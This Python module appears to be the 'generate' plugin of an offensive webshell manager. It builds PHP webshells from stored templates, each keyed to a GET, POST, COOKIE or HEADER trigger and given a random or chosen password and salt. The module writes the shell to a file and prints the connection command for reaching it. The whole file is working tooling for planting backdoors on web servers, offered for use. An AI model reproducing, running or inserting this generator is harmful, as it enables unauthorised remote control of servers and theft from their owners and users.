from libs.config import alias, color
from os import path
from string import ascii_letters, digits
from random import sample, randint
from Myplugin import Platform

TEMPLATE_PF = Platform("webshell_template", "get_php", True)


template_name_dict = {k: v for k, v in enumerate(TEMPLATE_PF.names(), 1)}
keyword_dict = {"GET": 3, "POST": 4, "COOKIE": 5, "HEADER": 6}


def ranstr(num):
    return ''.join(sample(ascii_letters + digits, num))


def get_php(keyword: int = 4, passwd: str = "", salt: str = "", _type: int = 1):
    template_name = template_name_dict[_type]
    return TEMPLATE_PF[template_name].get_php(keyword, passwd, salt)


def outside_generate(file_path: str, keyword: str = "POST", passwd: str = "", salt: str = "", _type: int = 1):
    try:
        _type = int(_type)
    except ValueError:
        print(color.red("\nType error\n"))
    run(file_path, keyword, passwd, salt, _type)


@alias(True, "gen", f="file_path", k="keyword", p="passwd", s="salt")
def run(file_name: str, keyword: str = "POST", passwd: str = "", salt: str = "", _type: int = 1):
    raw_keyword = keyword.upper()
    if (raw_keyword not in keyword_dict):
        print(color.red("\nKeyword error\n"))
        return
    keyword = keyword_dict[raw_keyword]
    if (_type not in template_name_dict):
        print(color.red("\nType error\n"))
        return
    passwd = str(passwd) if passwd else ranstr(randint(5, 8))
    salt = str(salt) if salt else ranstr(randint(5, 8))
    php = get_php(keyword, passwd, salt, _type)
    file_path, file_name = path.split(path.realpath(file_name))
    file_real_path = path.join(file_path, file_name)
    if (path.exists(file_real_path)):
        print(color.red("\nFile is exist\n"))
        return
    elif(not path.exists(file_path)):
        print(color.red("\nFile path is invalid\n"))
        return
    with open(file_real_path, "w+") as f:
        f.write(php)
    print(color.green(
        f"\ngenerate {template_name_dict[_type]}'s php in {file_real_path}! enjoy it!"))
    print(color.yellow("\nUsage:"))
    print(color.yellow(
        f"  connect url {raw_keyword} {passwd} doughnuts-{salt}"))


run.__doc__ = """
    generate

    Generate a webshell using doughnuts encoding (password and salt none is random).

    keyword:
      - GET
      - POST
      - COOKIE
      - HEADER

    _type:
""" + "\n".join("      - %s : %s" % (k, v) for k, v in template_name_dict.items()) + "\n"
